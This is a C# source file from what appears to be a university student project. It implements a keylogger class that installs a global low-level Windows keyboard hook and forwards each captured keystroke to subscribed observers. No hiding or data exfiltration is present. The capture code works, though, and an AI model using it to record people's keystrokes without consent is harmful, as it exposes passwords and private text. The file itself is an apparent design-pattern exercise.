/**************************************************************************
 *                                                                        *
 *  File:        Keylogger.cs                                             *
 *  Copyright:   (c) 2025, Adelina-Petronela Hritcu,                      *
 *                         Raluca-Elena Musteata,                         *
 *                         Simiuc Alexandru,                              *
 *                         Vasilca Rares-Mihai                            *
 *                                                                        *
 *  E-mail:      raluca-elena.musteata@student.tuiasi.ro                  *
 *               petronela-adelina.hritcu@student.tuiasi.ro               *
 *               alexandru.simiuc@student.tuiasi.ro                       *  
 *               rares-mihai.vasilca@student.tuiasi.ro                    *
 *  Description: Implementare keylogger                                   *
 *               This application implements a keylogger in C# using      *
 *               the Observer design pattern. The project has a modular   *
 *               architecture, making the codebase easy to extend and     *
 *               maintain, and includes unit testing capabilities to      *
 *               ensure component reliability. The application is         *
 *               structured to be easily integrated into other projects   *
 *               or adapted for various keyboard monitoring scenarios.    * 
 *                                                                        *
 *                                                                        *
 **************************************************************************/
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Windows.Forms;


namespace Keylogger
{   /// <summary>
    /// Clasa Keylogger care intercepteaza apasarile de taste folosind hook-uri Windows si notifica observatorii
    /// </summary>
    public class Keylogger : IObservable<KeyEvent>, IDisposable
    {
        private readonly List<IObserver<KeyEvent>> _observers = new List<IObserver<KeyEvent>>();
        private IntPtr _hookID;
        private LowLevelKeyboardProc _hookProc;
        private bool _disposed = false;
        private bool _isActive = false;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        /// <summary>
        /// Indica daca keylogger-ul este activ
        /// </summary>
        public bool IsActive
        {
            get => _isActive;
            set => _isActive = value;
        }
        /// <summary>
        /// Constructor care initializeaza hook-ul global pentru tastatura
        /// </summary>
        public Keylogger()
        {
            _hookProc = HookCallback;
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc, GetModuleHandle(null), 0);

            if (_hookID == IntPtr.Zero)
            {
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }
        }
        /// <summary>
        /// Permite unui observator sa se aboneze la evenimentele de tastare
        /// </summary>
        /// <param name="observer">Observatorul care se aboneaza.</param>
        /// <returns>Un obiect IDisposable pentru dezabonare.</returns>
        public IDisposable Subscribe(IObserver<KeyEvent> observer)
        {
            if (!_observers.Contains(observer))
                _observers.Add(observer);
            return new Unsubscriber(_observers, observer);
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN && !_disposed && _isActive)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                var keyEvent = new KeyEvent { Key = ((Keys)vkCode).ToString() };

                var observersSnapshot = _observers.ToArray();
                foreach (var observer in observersSnapshot)
                {
                    observer.OnNext(keyEvent);
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        /// <summary>
        /// Elibereaza resursele utilizate de hook
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!_disposed)
            {
                if (_hookID != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(_hookID);
                    _hookID = IntPtr.Zero;
                }
                _disposed = true;
            }
        }
        /// <summary>
        /// Destructor pentru eliberarea resurselor daca nu a fost apelata metoda Dispose
        /// </summary>
        ~Keylogger()
        {
            Dispose(false);
        }
        /// <summary>
        /// Clasa interna care gestioneaza dezabonarea observatorilor
        /// </summary>
        private class Unsubscriber : IDisposable
        {
            private readonly List<IObserver<KeyEvent>> _observers;
            private readonly IObserver<KeyEvent> _observer;
            /// <summary>
            /// Constructor care primeste lista de observatori si observatorul de eliminat
            /// </summary>
            /// <param name="observers">Lista de observatori.</param>
            /// <param name="observer">Observatorul de eliminat.</param>
            public Unsubscriber(List<IObserver<KeyEvent>> observers, IObserver<KeyEvent> observer)
            {
                _observers = observers;
                _observer = observer;
            }
            /// <summary>
            /// Eliminarea observatorului din lista
            /// </summary>
            public void Dispose()
            {
                if (_observer != null && _observers.Contains(_observer))
                    _observers.Remove(_observer);
            }
        }

        #region P/Invoke
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        #endregion
    }
}